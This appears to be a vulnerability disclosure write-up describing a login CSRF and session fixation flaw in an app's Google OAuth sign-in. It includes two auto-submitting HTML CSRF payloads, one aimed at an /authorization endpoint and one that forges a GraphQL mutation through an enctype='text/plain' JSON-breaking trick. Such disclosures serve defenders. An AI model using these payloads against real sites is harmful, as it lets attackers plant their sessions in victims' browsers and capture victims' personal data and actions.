# 🛂 Google OAuth CSRF – Session Fixation

**Severity:** Medium  
**Status:** Unresolved  
**Test Type:** OAuth flow tampering & CSRF  
**Bug Type:** CSRF + Session Fixation via Google Social Login

---

## 🧠 Summary

The app's Google authentication flow was vulnerable to a CSRF attack, allowing an attacker to force-login a victim using the attacker’s social auth token.

By tricking the victim into submitting a crafted form (CSRF) containing a valid `token` and `clientState`, the attacker could implant their session into the victim’s browser. This was possible due to improper validation of OAuth tokens and the absence of CSRF protections in both:

- The `POST` request to `/authorization` after Google redirects with the OAuth token
- The GraphQL `AuthenticationToken` mutation handling the token exchange
- Both endpoints independently lacked CSRF protection, making the attack possible through multiple vectors.

---

## 🚨 Exploited Endpoints

1. **`/authentication`**
2. **GraphQL Mutation:** `AuthenticationToken`

---

## 💥 Exploitation Flow

1. Attacker obtains their own valid Google OAuth token (`token`) by starting the login process.

2. Attacker crafts a malicious HTML form:

```
<form action="https://target.com/authorization" method="POST">
  <input type="hidden" name="token" value="ATTACKER_TOKEN">
  <input type="hidden" name="clientState" value="value">
</form>
<script>
  document.forms[0].submit();
</script>
```

3. Victim visits the attacker-controlled site. Their browser sends the attacker’s token to the backend.

4. The backend accepts the token and logs the victim in under the attacker’s session — or processes their actions under attacker identity.

---

## 🔥 GraphQL-Specific CSRF Trick

For the GraphQL mutation, a CSRF payload could still be sent via a normal form submission even though the endpoint expects JSON.

This was achieved by abusing how the server parsed incoming bodies when enctype="text/plain" was used, and by breaking the JSON structure in
```
<html>
<body>
<form id="csrfForm" action="https://target.com/graphql" method="POST" enctype="text/plain" style="display:none;">
  <input type="hidden" name='{"operationName":"AuthenticationToken","variables":{"input":{"AuthenticationToken":"ATTACKER_TOKEN"},"query":"mutation AuthenticationToken($input: AuthenticationTokenInput!) {\n  AuthenticationToken(input: $input) {\n    token\n    clientState\n    __typename\n  }\n}\n","fake":"' value='"}'>
</form>
<script>
  document.getElementById('csrfForm').submit();
  setTimeout(() => {
    window.location.href = 'https://target.com';
  }, 2000);
</script>
</body>
</html>
```
Key points about the trick:

- Using `enctype="text/plain"` causes the browser to send the form fields in a way that bypasses strict JSON content-type expectations.
- Breaking the body inside the form field (injecting `"fake":"' value='"`) tricks the backend into parsing it successfully.

---

## ⚡ Why enctype="text/plain" Works

Normally, GraphQL APIs expect `Content-Type: application/json` and reject anything else like `text/plain`.
However, this app did not enforce strict content types: when sent `text/plain`, the backend still tried to parse the body as JSON.
This allowed CSRF via a fake form even though browsers can't send `application/json` without CORS.

---

## 🔥 Impact
- Session Fixation via third-party auth (Google)
- Login CSRF with full account access via OAuth
- Victim’s PII (full name, email) sent to attacker’s account
- Any action taken post-login (e.g., checkout) stored under attacker session

---

🧩 Disclosure Timeline
- Reported: Feb 2025
- Fixed: Unresolved
- Reports: 2 as the same issue affected the main app and the api


